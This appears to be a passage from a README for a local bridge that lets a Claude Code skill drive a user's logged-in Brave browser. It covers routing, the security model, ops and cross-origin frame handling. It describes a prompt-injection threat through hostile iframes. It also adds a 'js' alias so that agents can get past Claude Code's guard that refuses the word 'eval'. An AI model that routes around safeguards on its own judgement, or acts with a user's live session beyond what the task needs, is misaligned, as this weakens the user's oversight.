# browser-bridge

A local, token-authenticated command channel that lets a Claude Code skill drive
the user's **real, logged-in Brave** browser. This is authorized personal
automation on the user's own workbench.

It is a **sibling** to the activity-collector's `scripts/collector/browser-ext/`
(a one-way telemetry sink). browser-bridge is a *command* channel and does not
touch the collector or its extension.

## Quick start / binary path

The executable lives at
`~/workspace/devrc/scripts/browser-bridge/browser` (also
`~/.claude/skills/browser/browser` if the skill dir is symlinked):

```bash
BB=~/workspace/devrc/scripts/browser-bridge/browser
$BB health                              # connected instances + count
$BB --instance <key> open <url>         # open a NEW tab this session owns → tabId
$BB --instance <key> --tab <id> html    # act on a specific tab
```

## Architecture

```
  Claude skill  ──HTTP POST /cmd──▶  server.py (loopback rendezvous)
   (scripts/browser-bridge/browser)        │
                                     GET /poll (long-poll) ▲   ▼ dispatch
                                            │
                                MV3 extension service_worker.js
                                  (runs in the LIVE Brave session)
                                            │
                          chrome.scripting / chrome.tabs / captureVisibleTab
                                            │
                                  POST /result  ──────────▶ back to the skill
```

Three actors, one loopback meeting point:

1. **`server.py`** — a stdlib `http.server` bound to `127.0.0.1:8788`. Holds a
   command queue and correlates each `POST /cmd` (skill) with the matching
   `POST /result` (extension) by an id.
2. **`extension/`** — a standalone MV3 extension. Its service worker long-polls
   `GET /poll`, executes the op against the active tab, and posts the result.
3. **`browser`** — the bash skill entrypoint Claude calls (`html`, `js`/`eval`,
   `tabs`, `nav`, `screenshot`, `health`, `instances`).

### Multiple instances per host

More than one Brave profile can each run the extension and be driven
independently. The server keeps a **registry of connected instances**, each with
its **own command queue** — a command for one profile is never delivered to
another's `/poll` (this is what fixes the 2× contention of the old single-queue
design when two profiles were connected).

- **Routing key.** Each instance has a stable auto-id (`crypto.randomUUID()`,
  persisted by the extension in `chrome.storage.local`) and an optional user
  **label** (set in the extension options). The effective routing key = the
  label if set, else the auto-id. **Labels are the human key and must be unique
  per host.**
- **Targeting.** With exactly one instance connected, no flag is needed
  (back-compat). With more than one and no `--instance`, a command **errors** and
  lists the connected instances (it never guesses). `browser --instance <key>
  <op>` targets one explicitly (the key matches either the label or the auto-id);
  an unknown key errors. `--instance` works for every op.
- **`browser instances`** lists the connected instances (routing key, label,
  auto-id, active-tab url/title) as JSON. `/health` also reports them.
- **`browser whoami`** (GET `/whoami`, bearer + Host guarded like `/health`, NOT
  rate-limited) is a read-only identity + diagnostics snapshot: **which HOST**
  (`host.label` ∈ `laptop`/`workbench`/`unknown`, resolved `ACTIVITY_HOST` env →
  the activity-collector env file → LAN-IP detect mirroring `ship.sh`
  `detect_role`; `host.source` names the method, `host.ips` the machine's
  non-loopback IPv4s), the connected **instances** (`key`/`label`/`instanceId`,
  the active-tab **DOMAIN** only — metadata-only, never the full URL — and the
  reported `extension_version`), and **bridge** diagnostics (`endpoint`, `port`,
  `server_version` = a `SERVER_VERSION` const + best-effort git short-HEAD,
  `connected` count, and `extension_version_current` = the manifest version the
  server EXPECTS Brave to have loaded — read from the deployed extension at
  `~/.local/share/browser-bridge-ext/`, falling back to the repo copy). It answers
  "am I on the laptop or the workbench, and which profile?" in one shot (both
  hosts are hostname `nixos`).
  **Explicit staleness verdict — an ALL-CLEAR comes from the BUILD MARKER (#324).** Each
  instance carries `extension_version` (loaded), `extension_version_expected`,
  `extension_build`, `extension_build_expected`, and **`extension_stale`**:
  `true` (this profile is running code that is not the deployed code → Remove +
  Load unpacked it), `false` (**verified current**), or **`null` = undecidable**.
  The bridge carries `extension_build_current` alongside
  `extension_version_current`.

  🔴 An all-clear is **not** a version comparison, and cannot be. `extension_version`
  is `chrome.runtime.getManifest().version` — it describes the manifest of the
  extension the worker LOADED — and `extension_id` is derived from the load PATH,
  so **neither describes the code that is executing**. MEASURED 2026-08-04: two Brave
  profiles loading the SAME directory reported an identical id, an identical
  `0.7.3` and `extension_stale: false`, while one ran `main` and the other an
  unmerged 0.7.2 build whose source existed on no disk. `extension_build` is a
  generated LITERAL (`extension/build_id.js`) that the service worker **imports**,
  so it is frozen into the loaded module graph and travels with the code — a stale
  worker reports the stale marker by construction.

  🔴 **It FAILS CLOSED — asymmetrically.** `false` means two markers present and
  identical, and nothing else can produce it: a marker missing on *either* side —
  an extension build predating #324, or an unreadable/undeployed source tree —
  never yields `false`. It yields `null` *unless* both versions are known and
  DISAGREE, which yields `true` — a mismatch is positive proof that the loaded
  code is not the deployed code, so a missing marker must not discard it. Only
  `true` is ever reachable from versions alone; `null` is never "fine".
  Staleness is also **per profile**: one can be current while another is
  not, at the same instant, from one directory.
  ⚠ A marker still cannot see a change you made and never deployed, and it says
  nothing about WHICH DIRECTORY the build came from — for that, read
  **`extension_id`** (below), and prefer a behavioural discriminator when the
  change has one.
  Each instance also carries **`extension_id`** (`chrome.runtime.id`, path-derived
  for an unpacked extension), and the bridge carries **`extension_dir_expected`**
  (the directory Brave should be pointed at). The server never computes an
  expected id — see the `ping` section for why.
- **Newest supersedes.** If a NEW connection (different auto-id) registers for a
  routing key that already has a live connection, the old one is dropped and any
  in-flight command on it resolves to a `superseded` error (no orphaned waiter).
  This handles a duplicate/stale connection cleanly. ⚠ Two *different* profiles
  sharing one label is a misconfiguration — **give each profile a unique label.**
  The displaced connection's own `/poll` gets a **distinct `409 superseded`
  signal** (not the idle `204`), on which the extension **backs off ~30s** (and
  surfaces a "superseded — set a unique label" state) rather than re-registering
  instantly. That deliberately breaks what would otherwise be a mutual-supersede
  **livelock** (two same-label workers re-polling at loopback speed, burning CPU
  and flooding the journal). The supersede is logged **once per displacement**,
  never per poll. (The server-side signal + once-logging are unit-tested; the
  extension's back-off can only be verified in a real browser — see below.)
- **Wire protocol.** `/poll` carries the instance identity in the
  `X-Bridge-Instance-Id` / `X-Bridge-Label` headers (+ optional
  `X-Bridge-Active-Url`/`-Title` for cheap `instances`/`health` enrichment);
  `/result` echoes its `instanceId` in the body; `/cmd` accepts an optional
  `target`. All of these stay bearer-authed and Host-checked — the security gate
  is unchanged. A legacy extension that polls with no identity is assigned one
  synthetic instance (`LEGACY_INSTANCE_ID`) so it still works unnamed.

### Transport: HTTP long-poll (not WebSocket)

An MV3 service worker can't bind a socket, so the local server is the rendezvous.
We use an **HTTP long-poll command queue**:

- The extension issues `GET /poll`, which blocks until a command is queued (or
  ~25s → `204`, then it immediately re-polls). A pending fetch keeps the MV3
  worker alive, so **the long-poll itself is the keepalive** — no RFC6455 ping.
- `POST /cmd` enqueues a command and blocks (bounded) for the reply.

Long-poll was chosen over a hand-rolled stdlib WebSocket because the whole
rendezvous stays pure `http.server` + `threading` and is **fully unit-testable
with stdlib alone** against an in-process fake extension — no new pip deps
(matching the receiver's stdlib-only footprint; the nix unit pins python312).

## Security model

The socket is loopback-only, but a malicious web page could still try to reach
it (DNS-rebinding). Two independent gates defeat that:

- **Bearer token** on *every* endpoint — the skill and the extension's long-poll
  alike. The secret is auto-created `0600` at `~/.config/browser-bridge/token`
  (`secrets.token_urlsafe`) on first start. Missing/wrong → `401`. A rebinding
  page cannot read the token file, so it cannot forge a request.
- **Host-header allowlist** — only `127.0.0.1` / `localhost` / `::1` accepted;
  anything else → `403`. A rebind victim page carries a foreign `Host`.

The extension holds `<all_urls>` host permissions + `scripting` (maximal — it
must run in whatever tab is active) and, for the CDP ops, the `debugger`
permission. This can be scoped down later; noted in `extension/README.md`. The CDP
layer's own bounded security model (own-tab-only attach, no raw-CDP passthrough,
always-detach) is in the **CDP ops** section below.

### No cookie op — deliberate (decided 2026-07-30)

There is **no `cookies` op** in the CLI, `server.py` or the extension, and the
manifest deliberately does **not** request the `cookies` permission (verified:
`permissions` is `["scripting","tabs","activeTab","storage","alarms","debugger",
"webNavigation"]`). A cookie-read op is credential exfiltration by definition —
it hands a live session token to a caller. Adding one would mean, at minimum:
hard-denying it to the autonomous browser-agent the way `upload` is (see
*opencode browser-agent*), audit-logging every read, and accepting that session
tokens land in Claude transcripts, which persist on disk. The value it buys does
not justify that, because the sanctioned alternative below covers the real use
case without any of it. **Recorded so it isn't re-litigated.**

Consequences to know:

- `document.cookie` via `eval` is the ONLY cookie surface, and it cannot see
  **HttpOnly** cookies — i.e. essentially every session/auth cookie. The cookie
  that matters is exactly the invisible one.
- On a CSP-strict origin the injected script doesn't run at all, so a cookie read
  there returns `null` with no error, indistinguishable from a broken bridge.

**Sanctioned pattern: don't extract the cookie — make the request from inside the
page.** An in-page `fetch(url, {credentials:"include"})` run through `eval`
attaches the cookies (HttpOnly included) automatically and returns only the
response data. It needs no new permission and keeps credential *values* out of
Claude's context and off disk. `eval` takes one expression, so use an async IIFE;
the promise is awaited (`chrome.scripting` on the top frame, CDP
`awaitPromise:true` for `--frame`), so you get the resolved value:

```bash
browser js '(async function(){ const r = await fetch("/api/thing", {credentials:"include"}); return JSON.stringify({status:r.status, body:(await r.text()).slice(0,500)}) })()'
```

Verified live 2026-07-30 against real Brave (laptop, both profiles):

- Same origin (`openrouter.ai`), same path, status only: `credentials:"include"`
  → **404**, `credentials:"omit"` → **401**. The differing status proves the
  HttpOnly session cookie WAS attached by the in-page fetch, with no cookie value
  ever crossing into the transcript.
- `(async function(){ return "resolved:"+(1+1) })()` → `"resolved:2"`, confirming
  the async-IIFE shape yields a resolved value, not a pending Promise.
- CSP contrast: on a `github.com` tab `browser js 'location.host'` → `null` (no
  error) while `text`/`html` work; the identical eval on `openrouter.ai` →
  `"openrouter.ai"`.

**Limitation, stated plainly:** the in-page fetch pattern does NOT work on
CSP-strict origins (GitHub, Discord, …) — no injected script runs there, so an
authenticated API call through the page is unavailable and `text`/`html` are the
only reads. (The recipe is verified mechanically and credential-wise as above; it
has not been exercised against a third-party authenticated API beyond that.)

## Ops

| op | maps to | returns |
|----|---------|---------|
| `getHtml`    | `chrome.scripting` → `document.documentElement.outerHTML`, byte-capped CLI-side (`maxBytes`, default 32768, `0`=uncapped) | `{url,title,domain,path,searchParams,tabId,html,truncated?,visibilityState,hidden?,note?}` |
| `text`       | `chrome.scripting` → `(selector?document.querySelector(selector):document.body).innerText`, normalized + byte-capped (`selector`/`maxBytes` optional); `--annotated` returns structured element extraction (`{text, path, tag, attrs, precedingText, followingText}`) | `{url,title,domain,path,searchParams,tabId,text,truncated,visibilityState,hidden?,note?}` |
| `context`    | **page metadata without DOM read** — `{url, domain, path, searchParams, title, tabId}`. Tab-scoped, no required fields | `{url,domain,path,searchParams,title,tabId}` |
| `eval`       | top frame: `chrome.scripting.executeScript` (MAIN world) of `js`; **`--frame`: CDP `Runtime.evaluate`** in the frame's context (same-process isolated world OR OOPIF flat session) — chrome.scripting can't eval a STRING | `{url,value,frame?,visibilityState,hidden?,note?}` |
| `tabs`       | `chrome.tabs.query({})`                                   | `{tabs:[...],ownedTabId}` |
| `nav`        | `chrome.tabs.update(tab,{url})`                           | `{tabId,url}` |
| `screenshot` | **CDP `Page.captureScreenshot`** (png) — works on a BACKGROUND/occluded tab + each profile's own tab; a foreground tab uses the cheap `captureVisibleTab` fast path. `fullpage` grabs the whole document. The CLI decodes `dataUrl` to a **`.png` on disk** and prints a path, never the base64 (see below) | `{url,dataUrl,via}` |
| `open`       | `chrome.tabs.create({url,active:false})` — **background/HIDDEN** (`visibilityState:"hidden"` → Chromium throttles it → a heavy SPA won't render → reads return a shell). The escape hatch is **`browser wake`** (or a `--wake` read): it un-throttles the tab and moves NO focus. Reads self-announce this via `hidden`/`note` | `{tabId,url}` |
| `close`      | `chrome.tabs.remove(tabId)`                               | `{closed:tabId}` |
| `emulate`    | **device emulation** — CDP `Emulation.setDeviceMetricsOverride` / `setTouchEmulationEnabled` / `setUserAgentOverride` (**+`userAgentMetadata`**) / `setEmulatedMedia` / `setTimezoneOverride` / `setGeolocationOverride`, from a named preset or raw params. **Sticky per tab** (re-applied inside every later CDP session) and **owned-tab-only**. `--reset` stops re-applying **and restores the viewport** — it sends an arm-then-clear pair, because a bare `clearDeviceMetricsOverride` is a measured no-op (#319). `--reset --recreate` replaces the tab (new tab id) instead, and is the only remedy for a tab the extension cannot reach | `{tabId,url,emulation,applied,note}` or `{tabId,url,reset,wasEmulating,cleared,restored,note}` |
| `frames`     | **`chrome.webNavigation.getAllFrames`** — the tab's frames INCLUDING cross-origin OUT-OF-PROCESS iframes (OOPIFs) | `{url,title,frames:[{frameId,url,parentFrameId}]}` |
| `click`      | top frame: **CDP** `getBoundingClientRect` → `Input.dispatchMouseEvent` (trusted); `--frame`: **SYNTHETIC** click via `chrome.scripting`; `selector` required, `frame` optional | `{url,clicked,x,y,frame,trusted}` |
| `type`       | top frame: **CDP `Input.insertText`** (trusted); `--frame`: **SYNTHETIC** input via `chrome.scripting`; `text` required, `selector`/`frame` optional | `{url,typed,frame,trusted}` |
| `key`        | top frame: **CDP `Input.dispatchKeyEvent`** (trusted); `--frame`: **SYNTHETIC** key via `chrome.scripting`; one bounded key; `key` required | `{url,key,frame,trusted}` |
| `wake`       | **UN-THROTTLE the tab WITHOUT touching focus** — CDP `Emulation.setFocusEmulationEnabled` (+ best-effort `Page.setWebLifecycleState`) held for a bounded settle (`waitMs`, default 1.5s, clamped ≤**6s**) so a background SPA gets real animation frames and renders, then **explicitly disables focus emulation** and detaches. Own-tab-scoped like every CDP op. **This is the remedy for a hidden/empty read — not `activate`.** ⚠ the un-throttled STATE ends at detach (measured); rendered DOM persists | `{tabId,url,title,woke,visibilityState,readyState,applied,skipped,settleMs,note}` |
| `--wake` on `text`/`html`/`eval` | the SAME un-throttle applied **inside the same CDP session as the read**, for a read that must OBSERVE live un-throttled state (rather than the DOM `wake` left behind). Opt-in only — the default read path is unchanged (see below) | the read's normal shape + `{woke,wake:{applied,settleMs}}` |
| `activate`   | **FOREGROUND the tab** — `chrome.tabs.update(tab,{active:true})` + `chrome.windows.update(windowId,{focused:true})`, then an OPTIONAL bounded wait-for-`status:"complete"` + paint settle (`waitMs`, clamped ≤8s; a discarded/never-completing tab returns promptly — no wedge). **⚠⚠ STEALS THE OPERATOR'S SCREEN** — the one intrusive op, and a **LAST RESORT**: use it only when something genuinely needs the REAL foreground (a permission prompt, a native picker, seeing it yourself). For a throttled/unrendered tab use `wake`. Needed at most **once per tab, never per read**. **Absent from the autonomous agent's op set** (not reachable via `OP_TO_SERVER`). **i3:** the server also raises the Brave window via `i3-msg`, but only when the command asks for it (`focus:true`; the CLI's `--focus`, defaulted on when stdout is a TTY) — otherwise the raise is `withheld` and the result carries a note. On a host with no i3 the answer is `skipped` whatever the flag says. This is a **default**, not an authorization boundary — see *Opt-in by default*. 🔴 `applied` is EARNED (#557): i3-msg exits 0 even for a criteria that matched NOTHING, so the server confirms via `get_tree` that a window was found and ended up focused. `i3_detail` says why — `focused` / `no_match` / `not_focused` / `tree_unreadable` / `focus_error` / `unavailable` / `no_title` / `not_requested`. A withheld raise makes no `get_tree` round trip at all | `{tabId,windowId,url,title,active,status,i3,i3_detail,note?}` |
| `upload`     | **CDP `DOM.setFileInputFiles`** — resolve the `<input type=file>` at `selector` to a RemoteObject, VERIFY it is a file input, then hand Chrome the ABSOLUTE `path` (Chrome reads the file itself — **no bytes cross the bridge**); `--frame` routes into a same-process iframe OR a cross-origin OOPIF (incl. a **NESTED** one — same bounded cascade + caps as `eval --frame`). Own-tab, #189-bounded, NO raw-CDP passthrough. **Data-exfil-capable → the server AUDIT-LOGS every upload** (op + target domain + path) and it is **OPERATOR-ONLY — not in the autonomous agent's default op set** (`BROWSER_AGENT_ALLOWED_OPS` opt-in only). `selector`+`path` required | `{ok,selector,frame,url,files:[basename]}` |

`open`/`close` are dispatched to the extension; `release` (drop ownership, don't
close the tab) is handled server-side and never reaches the extension.
`frames` enumerates via **`chrome.webNavigation`** and a `--frame` on the fixed-func
ops `getHtml`/`text`/`click`/`type`/`key` injects via **`chrome.scripting`** INTO
the resolved frame — this reaches CROSS-ORIGIN out-of-process iframes (OOPIFs) that
CDP `Page.getFrameTree` could NOT enumerate. **`eval --frame` is the exception: it
runs via CDP `Runtime.evaluate`, NOT `chrome.scripting`** — `chrome.scripting` runs a
serialized FUNC, so it can't evaluate an arbitrary JS STRING in the frame (it returned
`value:null`-as-success), whereas `Runtime.evaluate` runs the string in the frame's
execution context (same-process isolated world, or the OOPIF's own flat session via
`Target.setAutoAttach`) and surfaces exceptions as a clear `frame_eval_failed` error —
never a silent null. `--frame <numeric-frameId|url-substring>`
selects the frame (the identifier is the numeric webNavigation `frameId`). **Resolution
is deterministic:** an exact numeric `frameId` always wins; a URL substring is matched
**HOST-first** (against each frame's hostname before its path — so
`--frame model-benchmarking` picks the OOPIF host `model-benchmarking.example.test`, not the
top page's `…/run/model-benchmarking` path); a substring matching **multiple** frames
fails with `ambiguous_frame:<n> [<id>:<url>, …]` (re-issue with the numeric id) rather
than silently choosing the first. **Prefer a numeric `frameId` or a host substring.**
**Nested OOPIFs are reached** (`setAutoAttach({flatten})` isn't recursive, so the
resolver re-arms it on each attached CHILD session and walks the cascade down the frame
tree) — bounded by depth **5** / **50** targets / a ~3 s wait ceiling, each failing loud
(`oopif_depth_cap` / `oopif_target_cap` / `frame_not_found:<url>`) and a duplicate-URL
match failing `ambiguous_frame`. See the CDP section below. `screenshot`,
`eval --frame`, and TOP-frame trusted input use **CDP (chrome.debugger)** (see the CDP
section below). A `--frame` op reports the FRAME's own `url` (so a caller can confirm it
read the intended frame, not the top document). The tab-scoped ops
(`getHtml`/`text`/`eval`/`nav`/`screenshot`/`close`/`frames`/`click`/`type`/`key`/`wake`/`activate`/`emulate`/`context`)
run against
the calling session's owned tab when it has one (see Session isolation), else the
active tab. `text` is the **cheap read**: it returns visible `innerText` (~KB)
rather than full `outerHTML` (~100s of KB) — the read the opencode browser-agent
uses. The `text` whitespace-normalization + byte-cap live in
`extension/protocol.js` (`normalizeText`, unit-tested); a `--max-bytes` cap
(default 32 KB, `0`=uncapped) truncates with a `…[truncated N bytes]` note.

**`text --annotated`** returns structured element extraction instead of flat
`innerText`. Each element has `{text, path, tag, attrs, precedingText, followingText}`
where `attrs` includes `id`, `class`, `href`, `src`, `alt`, `title`, `name`,
`placeholder`, `type`, `role`, `aria-label`, `data-testid`, `data-cy`, `data-e2e`.
Byte-capped. Works with `--frame` (frame-relative CSS paths).

**`context`** returns page metadata without reading the DOM: `{url, domain, path,
searchParams, title, tabId}`. No required fields. Tab-scoped (needs an active/owned
tab). Useful for cheap page identification without incurring a DOM read.

**Enriched envelope fields.** Every `text` and `html` result now includes `domain`,
`path`, `searchParams`, and `tabId` alongside the existing `url` and `title` fields.
These are additive and backward-compatible — callers that only read `url`/`title` are
unchanged.

### CLI output discipline (`screenshot`, `html`) and the `js` alias

Three CLI-surface behaviours — no server/extension involvement, so they need no
Brave restart:

- **`screenshot` never prints base64.** The data URL is 100s of KB (~133K–890K
  tokens per call) and is useless in an agent's context — it can't see an image
  from a data URL, it has to `Read` a `.png` anyway. So the CLI always decodes and
  writes a file: to an explicit `path` (prints just the path, unchanged), or with
  no path to a `browser-screenshot-*.png` temp file (`tempfile.gettempdir()`, so
  `TMPDIR` is honoured), printing compact JSON `{ok,path,bytes,url,via}`.
  **`--data-url`** is the explicit escape hatch that restores the old
  raw-data-URL output; it is mutually exclusive with `path`.
  Because a screenshot is a pixel-perfect image of an **authenticated** view, the
  temp file is privacy-handled rather than just dropped in a shared `/tmp`:
  - created with `tempfile.mkstemp` → `O_CREAT|O_EXCL|O_RDWR` at **mode 0600**
    (plain `open()` would inherit umask and land 0644 = world-readable), which is
    also the correct primitive against a pre-planted symlink;
  - **auto-pruned after 24h** on each `screenshot` invocation — strictly scoped to
    the `browser-screenshot-*.png` prefix in the temp dir, `lstat`-based so a
    symlink is judged as itself and only a REGULAR file is ever unlinked, and
    entirely best-effort (a prune error never fails the capture). Copy a capture
    to an explicit `path` if you need to keep it longer.
  - the payload is **validated before any write** — strict base64
    (`validate=True`; the default silently drops non-alphabet chars, so junk and
    `""` both decoded to `b""` and produced a 0-byte "successful" `.png`) plus the
    8-byte PNG signature. Both failure modes exit non-zero with a clear message
    and leave no file behind.
- **`html` is byte-capped like `text`.** `--max-bytes N`, default 32768, `0` =
  genuinely uncapped, and truncation uses the SAME convention as `normalizeText`:
  the kept prefix (cut on a UTF-8 boundary) gets `\n…[truncated N bytes]` appended
  and `truncated` is set — never silent. The cap is applied CLI-side (`cap_html`
  in `browser`) because the extension's `getHtml` has no cap; `maxBytes` is still
  sent on the wire so a future extension-side cap composes. Under the cap the
  response is passed through **byte-identically** (no reserialization, no
  `truncated` field), so an ordinary read is unchanged.
- **`js` is a first-class alias for `eval`.** Claude Code's worktree-isolation
  guard pattern-matches the literal token `eval` in a command string and REFUSES
  to run it ("this command runs a string through eval, which can't be verified to
  stay inside the worktree"). It is reacting to the WORD, not the behaviour:
  `browser eval` ships a JS string over loopback to Brave and runs it in the PAGE
  — no filesystem access, nothing that could escape the worktree. So
  worktree-isolated agents should use **`browser js '<expr>'`**. `eval` keeps
  working unchanged and is NOT deprecated (a deprecation warning would just
  re-introduce the token). **The op sent ON THE WIRE is `eval` for both
  spellings** — the extension only knows `eval`; `js` is a CLI-surface alias only.

Server envelope: `POST /cmd` → `200 {"ok":true,"result":{id,ok,data}}`, or a
structured error: `503 extension_not_connected`, `504 timeout`,
`409 ambiguous_instance` (>1 connected, no `target`), `409 no_owned_tab`
(`close` with nothing owned), `409 superseded`, `404 unknown_instance`,
`400 unknown_op|missing_field:<f>`, `400 bad_tab` (a non-numeric/non-scalar
`tab` from a raw caller — the CLI already validates `--tab`), `401 unauthorized`,
`403 bad_host`, `429 rate_limited|queue_full` (the per-instance concurrency
backstop — see below; body carries a `retry_after` hint).

## Frame ops (webNavigation + scripting) & CDP ops (debugger)

**Cross-origin frames (OOPIFs) — `frames` + `--frame`.** `frames` enumerates via
`chrome.webNavigation.getAllFrames` and `--frame` reads/input inject via
`chrome.scripting.executeScript({target:{frameIds:[id]}})`. This fixes the
cross-origin-iframe gap: under Chrome site isolation a cross-origin iframe is an
OUT-OF-PROCESS iframe (OOPIF) in its own renderer, which CDP `Page.getFrameTree` from
the top tab target does NOT enumerate — so `frames` never listed it and `--frame` could
never target it. `getAllFrames` sees OOPIFs and `scripting` injects into them (given
`<all_urls>`), with NO debugger banner. The frame identifier is the **numeric**
webNavigation `frameId`. In-frame input is **SYNTHETIC** (`isTrusted:false`) — the
reachable OOPIF path (a trusted CDP `Input.*` event from the top target can't easily
reach an OOPIF), and enough to drive most apps.

**`eval --frame` runs via CDP `Runtime.evaluate` (not `chrome.scripting`).** The
fixed-func frame ops above work because `chrome.scripting.executeScript` runs a
serialized FUNCTION. But `eval` is an arbitrary JS STRING, and routing a string through
a `func` that `new Function(src)`s it inside the frame's isolated world hits the
extension CSP / returns `value:null`-as-success — it never truly evaluates (the bug).
So `eval --frame` attaches `chrome.debugger` to the OWNED tab and resolves the target
frame's execution context by URL (the numeric webNavigation `frameId` does not map 1:1
to a CDP frame/target): a **same-process** frame is found in the top session's
`Page.getFrameTree` → `Page.createIsolatedWorld` → `Runtime.evaluate({contextId})`; a
**cross-origin OOPIF** is not in that tree → `Target.setAutoAttach({flatten:true})`
auto-attaches its target (matched by URL) → `Runtime.evaluate` in that flat session.

**Nested OOPIFs — the bounded recursive cascade.** `Target.setAutoAttach` is **NOT
recursive**: sent on a session it auto-attaches only that session's DIRECT child targets.
So a **grandchild** cross-origin iframe never produced an `attachedToTarget` on the tab's
top session and `eval --frame` on it failed `frame_not_found` (fails safe, but the
capability was missing — `text`/`html`/`click`/`type`/`key --frame` reach such a frame
because they go via `chrome.scripting`). The resolver now **re-arms `setAutoAttach` on
each attached child session** (flat mode forwards a `sessionId`), walking the cascade down
until the wanted frame's target appears. It is **ONE shared resolver**
(`resolveOopifSession`, pure + unit-tested in `extension/protocol.js`) used by BOTH
`eval --frame` and the OOPIF branch of `upload --frame` — they cannot diverge. A hostile
page can nest/spawn frames without limit, so the descent is hard-bounded, and every bound
fails LOUD rather than truncating silently or hanging:

- `OOPIF_MAX_DEPTH` = **5** levels below the tab → `oopif_depth_cap:5`;
- `OOPIF_MAX_TARGETS` = **50** distinct sessions per op → `oopif_target_cap:50`;
- attach events arrive **asynchronously** (a `setAutoAttach` reply does NOT mean its
  events landed), so the resolver waits on a quiet-window settle (`OOPIF_SETTLE_MS`,
  600 ms, RESTARTED on each newly-issued `setAutoAttach` so a slow level is never cut off
  mid-descend) under a hard ceiling (`OOPIF_WAIT_MS`, 5 s — well inside `CDP_OP_BUDGET_MS`);
  a timeout surfaces as `frame_not_found:<url>`, never a silent null and never a hang.
  The ceiling is checked **first each iteration, above the descend branch** — an earlier
  revision checked it only when there was nothing left to descend into, so a page that
  kept the queue non-empty never reached it and the real wall became `CDP_OP_BUDGET_MS`
  (surfacing as `cdp_timeout:op`). It is now a true wall;
- **ambiguity fails loud**: with nesting two frames can share a URL, so >1 matching
  attached session → `ambiguous_frame:<n> [<sessionId>:<url>, …]` (mirroring
  `resolveWebNavFrame`) instead of silently picking the first.

A match already in hand always wins over a cap hit in the same batch.

**The explicit boundary that replaces the old implicit one.** The pre-recursion code drew
part of its safety from only ever looking ONE level below a tab whose URL
`assertCdpAttachable` had validated. Recursion removes that, so every discovered target is
filtered on three axes in `onEvt` before it is tracked, descended into, or matched:

1. **Own tab / own cascade** — `chrome.debugger.onEvent` is a GLOBAL listener, so
   ownership must be PROVEN per event. When `source.tabId` is present it is authoritative
   and must equal this op's tab. When it is **absent** — which live evidence says is the
   case for SUB-session events, and which made the first cascade implementation inert at
   level 2 — ownership falls back to **session parentage**: the event's `source.sessionId`
   must be a session THIS cascade attached. An event proving neither is dropped
   (`drop:unowned`), so it still fails closed; the fallback is not blanket trust.
2. **`iframe` targets only** (`OOPIF_TARGET_TYPES`) — a page can `new Worker(location.href)`
   to mint a target with a url IDENTICAL to a real frame's. Unfiltered that lets any
   cross-origin frame permanently deny service to itself (forced `ambiguous_frame`) and,
   after a navigation race, could route the operator's JS into a WORKER global.
   `Target.setAutoAttach` is also sent with `filter:[{type:"iframe"}]` so Chrome ideally
   never attaches one at all — but that parameter is EXPERIMENTAL, so a rejection is
   caught and the call transparently retried without it (**fail-soft**); the listener-side
   check is the authoritative control and needs no protocol support.
3. **http/https only** (`isCdpAttachableUrl` — the same gate the top tab passes). Without
   it a hostile page embeds `<iframe src="chrome-extension://<id>/…">` (any extension with
   `web_accessible_resources`); `getAllFrames` lists it, and a prompt-injected agent could
   run operator JS inside ANOTHER EXTENSION'S ORIGIN — the top-tab guard bypassed by being
   one level down.

Every other existing security property is preserved: own-tab-only attach, the pre-attach
privileged-scheme refusal, always-detach, the `onEvent` listener removed in a `finally`
**inside** the resolver, no raw-CDP passthrough (the method set is unchanged — the cascade
only re-sends `Target.setAutoAttach`), and metadata-only telemetry.

**Known limitation — duplicate-URL OOPIFs have NO escape hatch.** The CDP path matches by
frame URL only (a numeric webNavigation frameId has no 1:1 CDP target mapping and is
discarded), so two identical `<iframe src="…/widget">` are both matched and the op fails
`ambiguous_frame` — and re-issuing with the numeric id, the remedy the generic `--frame`
docs give, provably cannot help here. A refusal, not a wrong frame, but a dead end for
`eval`/`upload`; the fixed-func frame ops are unaffected. **Follow-up (cheap, not done):**
the resolver already records `parentSessionId` per attached target and the caller has the
frame's `parentFrameId` chain, so a parent-chain tiebreak is implementable — it was left
out because the ancestor→session mapping is subtle when an intermediate frame is
same-process (its target IS the top session) and that cannot be validated without live
Brave.

**Failure diagnostics (`formatCascadeTrace`).** Every OOPIF failure —
`frame_not_found`/`oopif_depth_cap`/`oopif_target_cap` — appends ONE compact
`cascade[exit=… attach=… events=… accepted=… filter=… caps=…]` header plus up to
`OOPIF_TRACE_MAX` (20) per-event rows recording each observed target's `type`, whether
`source.tabId` was present and matched, whether its parent session was known, the computed
depth, and the drop reason. Bounded by construction, so a frame-spamming page cannot blow
up the error. It is **caller-facing error text only** (frame URLs appear, as they already
do in `ambiguous_frame`) and is **never** fed to telemetry, which stays metadata-only.
This exists because live run #1 failed and produced nothing to reason from; on run #2 the
trace answered the depth question in ONE command instead of another restart cycle. Keep
it — a bounded self-describing failure is the difference between a verify round and a
guess.

**✅ LIVE-VERIFIED (run #2, real Brave).** Check A: a grandchild OOPIF evaluates
correctly. Check B (7-level deep rig): depth 3 → `"deep3-reached"`, depth 5 →
`"deep5-reached"`, depth 6 → `oopif_depth_cap:5` with `exit=depth-cap events=5 accepted=5`
and **four chained sub-session auto-attaches** visible in the trace's `attach=` chain. So
the cascade descends through every permitted level, all five were attributed correctly,
and the sixth was refused: **`OOPIF_MAX_DEPTH = 5` is a real, measured guarantee, not a
contingent one.** `filter=on` in that trace also confirms Chrome accepts the experimental
`filter:[{type:"iframe"}]` param and that real OOPIFs pass the type gate.

**📌 Discovered Chrome behaviour — the durable lesson from this arc.**
**Chrome does NOT populate `source.tabId` on SUB-session `Target.attachedToTarget`
events**; they carry `sessionId` only. This is not documented anywhere obvious and it cost
a full verify round: the first implementation's fail-closed own-tab check therefore
dropped *every* level-2+ event, and the cascade went **inert** — returning
`frame_not_found` and **never** a depth cap, because no nested session was ever recorded.
"Inert, not capped" was the diagnostic signature. Hence ownership is proven by **session
parentage** (`source.sessionId` ∈ sessions this cascade attached), with `tabId` still
authoritative when present. **If you ever add a listener-side own-tab gate to a flat-mode
CDP cascade, this is the trap.**

`tests/fixtures/oopif-rig/` carries both fixtures — a 3-domain grandchild rig (Check A,
which also confirms the `iframe` type assumption by construction) and a 7-level
alternating-domain "deep" rig (Check B) that discriminates a binding depth cap from a
broken one. Its README records **both** runs — #1's failure and #2's known-good baseline
with the real trace — plus how to read the readout.

Everything is bounded by the per-op CDP timeouts (a bad frame fails fast, never wedges),
and the never-silent-null contract holds: a genuine `null`/`undefined` is returned as a
